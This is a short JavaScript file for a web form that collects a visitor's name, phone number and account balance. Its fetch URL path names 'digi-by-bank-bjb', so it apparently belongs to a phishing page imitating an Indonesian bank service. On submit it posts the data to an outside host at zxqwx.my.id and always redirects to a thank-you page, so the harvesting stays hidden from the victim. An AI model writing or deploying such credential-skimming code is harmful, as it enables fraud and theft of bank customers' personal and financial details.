$(document).ready(function() {
	$("#balance").on('input', function() {
		let value = $("#balance").val().trim().replace(/[^0-9]/g, '');
        $("#balance").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

function next() {
	var name = $("#name").val().trim();
	var phone = $("#phone").val().trim();
	var balance = $("#balance").val().trim();
	if (name=="" || phone=="" || balance=="") {
		alert("Mohon lengkapi data!");
		return;
	}
	$("#loader").css('display', 'flex');
	var message = ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\n'+balance+'\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"digi-by-bank-bjb/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
	window.location.href = "thank.html";
}

module.next = next;